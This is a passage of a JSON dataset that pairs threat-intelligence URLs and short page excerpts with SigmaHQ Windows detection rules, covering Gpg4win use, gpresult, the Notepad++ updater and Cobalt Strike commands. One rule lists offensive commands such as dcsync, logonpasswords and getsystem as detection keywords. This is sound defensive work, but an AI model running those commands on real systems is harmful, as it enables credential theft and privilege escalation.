      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -d ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_decryption.yml"
  },
  "178": {
    "url": "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/",
    "markdown": "",
    "sigma_rule": {
      "title": "File Decryption Using Gpg4win",
      "id": "037dcd71-33a8-4392-bb01-293c94663e5a",
      "status": "test",
      "description": "Detects usage of Gpg4win to decrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -d ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_decryption.yml"
  },
  "179": {
    "url": "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
    "markdown": "# BATLOADER: The Evasive Downloader Malware **Category:** Threat Intelligence **Date:** November 14, 2022 ## Executive Summary VMware Carbon Black Managed Detection and Response (MDR) analysts are constantly handling security incidents within our customer environments and tracking emerging and persistent malware campaigns. One such threat that has been particularly prevalent over the last couple of months is BatLoader. Named by Mandiant [1], BatLoader is an initial access malware that heavily uses batch and PowerShell scripts to gain a foothold on a victim machine and deliver other malware. The threat actors utilize search engine optimization (SEO) poisoning to lure users to download",
    "sigma_rule": {
      "title": "File Encryption Using Gpg4win",
      "id": "550bbb84-ce5d-4e61-84ad-e590f0024dcd",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -c ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_encryption.yml"
  },
  "180": {
    "url": "https://www.gpg4win.de/documentation.html",
    "markdown": "# Documentation The Gpg4win Compendium is an old style documentation to get into the world of cryptography. Using the example of Gpg4win, you learn step by step the secure use of Kleopatra, GpgEX and GpgOL. ## Gpg4win Compendium for Version 2 (old) The \"Gpg4win-Compendium\" is the end-user documentation for Gpg4win2. It combines the approximately 190 pages of the previously separate Gpg4win manuals \"Einsteiger\" and \"Durchblicker\". All chapters were reworked, extended, and updated for Gpg4win version 2. Among other enhancements, it covers Kleopatra, GpgEX and PGP/MIME, as well as S/MIME and X.509. Note: The English language version of the Gpg4win-Compendium is",
    "sigma_rule": {
      "title": "File Encryption Using Gpg4win",
      "id": "550bbb84-ce5d-4e61-84ad-e590f0024dcd",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -c ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_encryption.yml"
  },
  "181": {
    "url": "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/",
    "markdown": "",
    "sigma_rule": {
      "title": "File Encryption Using Gpg4win",
      "id": "550bbb84-ce5d-4e61-84ad-e590f0024dcd",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -c ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_encryption.yml"
  },
  "182": {
    "url": "https://www.trendmicro.com/vinfo/vn/threat-encyclopedia/malware/ransom.bat.zarlock.a",
    "markdown": "# Ransom.BAT.ZARLOCK.A **Published on:** August 01, 2019 | | | | ----------------------- | ------- | | Platform: | Windows | | OVERALL RISK RATING: | Low | | DAMAGE POTENTIAL: | High | | DISTRIBUTION POTENTIAL: | Low | | REPORTED INFECTION: | Low | | INFORMATION EXPOSURE: | Low | ## Threat Type: **Ransomware** ## Destructiveness: **No** ## Encrypted: **No** ## In the wild: **Yes** ## OVERVIEW **Infection Channel:** Downloaded from the Internet This Ransomware arrives on a system as a file dropped by other malware or as a file downloaded unknowingly by users when visiting malicious sites. -",
    "sigma_rule": {
      "title": "Portable Gpg.EXE Execution",
      "id": "77df53a5-1d78-4f32-bc5a-0e7465bd8f41",
      "status": "test",
      "description": "Detects the execution of \"gpg.exe\" from uncommon location. Often used by ransomware and loaders to decrypt/encrypt data.",
      "references": [
        "https://www.trendmicro.com/vinfo/vn/threat-encyclopedia/malware/ransom.bat.zarlock.a",
        "https://securelist.com/locked-out/68960/",
        "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-06",
      "modified": "2023-11-10",
      "tags": [
        "attack.impact",
        "attack.t1486"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "OriginalFileName": "gpg.exe"
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "filter_main_legit_location": {
          "Image|contains": [
            ":\\Program Files (x86)\\GNU\\GnuPG\\bin\\",
            ":\\Program Files (x86)\\GnuPG VS-Desktop\\",
            ":\\Program Files (x86)\\GnuPG\\bin\\",
            ":\\Program Files (x86)\\Gpg4win\\bin\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_portable_execution.yml"
  },
  "183": {
    "url": "https://securelist.com/locked-out/68960/",
    "markdown": "# ‘Locked Out’ **Publications** **12 Mar 2015** ## The evolution of encrypters and user errors Today the great majority of malware is created with the aim of enrichment. One of the tactics often used by evildoers is to encrypt files and demand a ransom for their decryption. Kaspersky Lab classes such programs as Trojan-Ransom malware, although there is another widely used and resonant name – **encrypters**. Encrypters have become a serious problem for users, especially corporate users. And related topics attract the most posts and readers on our forum. Despite all the efforts of the anti-virus companies we don’t expect",
    "sigma_rule": {
      "title": "Portable Gpg.EXE Execution",
      "id": "77df53a5-1d78-4f32-bc5a-0e7465bd8f41",
      "status": "test",
      "description": "Detects the execution of \"gpg.exe\" from uncommon location. Often used by ransomware and loaders to decrypt/encrypt data.",
      "references": [
        "https://www.trendmicro.com/vinfo/vn/threat-encyclopedia/malware/ransom.bat.zarlock.a",
        "https://securelist.com/locked-out/68960/",
        "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-06",
      "modified": "2023-11-10",
      "tags": [
        "attack.impact",
        "attack.t1486"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "OriginalFileName": "gpg.exe"
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "filter_main_legit_location": {
          "Image|contains": [
            ":\\Program Files (x86)\\GNU\\GnuPG\\bin\\",
            ":\\Program Files (x86)\\GnuPG VS-Desktop\\",
            ":\\Program Files (x86)\\GnuPG\\bin\\",
            ":\\Program Files (x86)\\Gpg4win\\bin\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_portable_execution.yml"
  },
  "184": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md",
    "markdown": "# T1486 - Data Encrypted for Impact ## Description from ATT&CK > Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted. >",
    "sigma_rule": {
      "title": "Portable Gpg.EXE Execution",
      "id": "77df53a5-1d78-4f32-bc5a-0e7465bd8f41",
      "status": "test",
      "description": "Detects the execution of \"gpg.exe\" from uncommon location. Often used by ransomware and loaders to decrypt/encrypt data.",
      "references": [
        "https://www.trendmicro.com/vinfo/vn/threat-encyclopedia/malware/ransom.bat.zarlock.a",
        "https://securelist.com/locked-out/68960/",
        "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-06",
      "modified": "2023-11-10",
      "tags": [
        "attack.impact",
        "attack.t1486"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "OriginalFileName": "gpg.exe"
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "filter_main_legit_location": {
          "Image|contains": [
            ":\\Program Files (x86)\\GNU\\GnuPG\\bin\\",
            ":\\Program Files (x86)\\GnuPG VS-Desktop\\",
            ":\\Program Files (x86)\\GnuPG\\bin\\",
            ":\\Program Files (x86)\\Gpg4win\\bin\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_portable_execution.yml"
  },
  "185": {
    "url": "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
    "markdown": "# BATLOADER: The Evasive Downloader Malware **Category:** Threat Intelligence **Date:** November 14, 2022 ## Executive Summary VMware Carbon Black Managed Detection and Response (MDR) analysts are constantly handling security incidents within our customer environments and tracking emerging and persistent malware campaigns. One such threat that has been particularly prevalent over the last couple of months is BatLoader. Named by Mandiant [1], BatLoader is an initial access malware that heavily uses batch and PowerShell scripts to gain a foothold on a victim machine and deliver other malware. The threat actors utilize search engine optimization (SEO) poisoning to lure users to download",
    "sigma_rule": {
      "title": "File Encryption/Decryption Via Gpg4win From Suspicious Locations",
      "id": "e1e0b7d7-e10b-4ee4-ac49-a4bda05d320d",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations.",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-11-30",
      "modified": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Product": "GNU Privacy Guard (GnuPG)"
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "-passphrase"
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_susp_location.yml"
  },
  "186": {
    "url": "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/",
    "markdown": "",
    "sigma_rule": {
      "title": "File Encryption/Decryption Via Gpg4win From Suspicious Locations",
      "id": "e1e0b7d7-e10b-4ee4-ac49-a4bda05d320d",
      "status": "test",
      "description": "Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations.",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-11-30",
      "modified": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Product": "GNU Privacy Guard (GnuPG)"
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "-passphrase"
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_susp_location.yml"
  },
  "187": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
    "markdown": "# T1615 - Group Policy Discovery ## Description from ATT&CK Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\\\SYSVOL\\\\Policies\\`. (Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) Adversaries may use commands such as `gpresult`",
    "sigma_rule": {
      "title": "Gpresult Display Group Policy Information",
      "id": "e56d3073-83ff-4021-90fe-c658e0709e72",
      "status": "test",
      "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
        "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
      ],
      "author": "frack113",
      "date": "2022-05-01",
      "tags": [
        "attack.discovery",
        "attack.t1615"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gpresult.exe",
          "CommandLine|contains": [
            "/z",
            "/v"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpresult_execution.yml"
  },
  "188": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
    "markdown": "",
    "sigma_rule": {
      "title": "Gpresult Display Group Policy Information",
      "id": "e56d3073-83ff-4021-90fe-c658e0709e72",
      "status": "test",
      "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
        "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
      ],
      "author": "frack113",
      "date": "2022-05-01",
      "tags": [
        "attack.discovery",
        "attack.t1615"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gpresult.exe",
          "CommandLine|contains": [
            "/z",
            "/v"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpresult_execution.yml"
  },
  "189": {
    "url": "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
    "markdown": "",
    "sigma_rule": {
      "title": "Gpresult Display Group Policy Information",
      "id": "e56d3073-83ff-4021-90fe-c658e0709e72",
      "status": "test",
      "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
        "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
      ],
      "author": "frack113",
      "date": "2022-05-01",
      "tags": [
        "attack.discovery",
        "attack.t1615"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gpresult.exe",
          "CommandLine|contains": [
            "/z",
            "/v"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpresult_execution.yml"
  },
  "190": {
    "url": "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Gpresult Display Group Policy Information",
      "id": "e56d3073-83ff-4021-90fe-c658e0709e72",
      "status": "test",
      "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
        "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
      ],
      "author": "frack113",
      "date": "2022-05-01",
      "tags": [
        "attack.discovery",
        "attack.t1615"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gpresult.exe",
          "CommandLine|contains": [
            "/z",
            "/v"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpresult_execution.yml"
  },
  "191": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt10-targeting-japanese-corporations-using-updated-ttps/",
    "markdown": "# APT10 Targeting Japanese Corporations Using Updated TTPs **September 13, 2018** --- ## Introduction In July 2018, FireEye devices detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector. APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities. In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor. This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently.",
    "sigma_rule": {
      "title": "Suspicious GUP Usage",
      "id": "0a4f6091-223b-41f6-8743-f322ec84930b",
      "status": "test",
      "description": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/apt10-targeting-japanese-corporations-using-updated-ttps/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2019-02-06",
      "modified": "2022-08-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\GUP.exe"
        },
        "filter_programfiles": {
          "Image|endswith": [
            "\\Program Files\\Notepad++\\updater\\GUP.exe",
            "\\Program Files (x86)\\Notepad++\\updater\\GUP.exe"
          ]
        },
        "filter_user": {
          "Image|contains": "\\Users\\",
          "Image|endswith": [
            "\\AppData\\Local\\Notepad++\\updater\\GUP.exe",
            "\\AppData\\Roaming\\Notepad++\\updater\\GUP.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Execution of tools named GUP.exe and located in folders different than Notepad++\\updater"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gup_suspicious_execution.yml"
  },
  "192": {
    "url": "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Commands",
      "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
      "related": [
        {
          "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003",
        "stp.1u"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|startswith": [
            "cmd ",
            "cmd.exe",
            "c:\\windows\\system32\\cmd.exe"
          ],
          "CommandLine|contains": [
            "psinject",
            "spawnas",
            "make_token",
            "remote-exec",
            "rev2self",
            "dcsync",
            "logonpasswords",
            "execute-assembly",
            "getsystem"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml"
  },
  "193": {
    "url": "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Commands",
      "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
      "related": [
        {
          "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003",
        "stp.1u"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|startswith": [
            "cmd ",
            "cmd.exe",
            "c:\\windows\\system32\\cmd.exe"
          ],
          "CommandLine|contains": [
            "psinject",
            "spawnas",
            "make_token",
            "remote-exec",
            "rev2self",
            "dcsync",
            "logonpasswords",
            "execute-assembly",
            "getsystem"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml"
  },
  "194": {
    "url": "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Commands",
      "id": "647c7b9e-d784-4fda-b9a0-45c565a7b729",
      "related": [
        {
          "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell",
      "references": [
        "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
        "https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",
        "https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-05-06",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.003",
        "stp.1u"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "Cmd.Exe"
          },
          {
            "Image|endswith": "\\cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|startswith": [
            "cmd ",
            "cmd.exe",
            "c:\\windows\\system32\\cmd.exe"
          ],
          "CommandLine|contains": [
            "psinject",
            "spawnas",
            "make_token",
            "remote-exec",
            "rev2self",
            "dcsync",
            "logonpasswords",
            "execute-assembly",
            "getsystem"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml"
  },
  "195": {
    "url": "https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Operator Bloopers Cobalt Strike Modules",
      "id": "4f154fb6-27d1-4813-a759-78b93e0b9c48",
      "related": [
        {
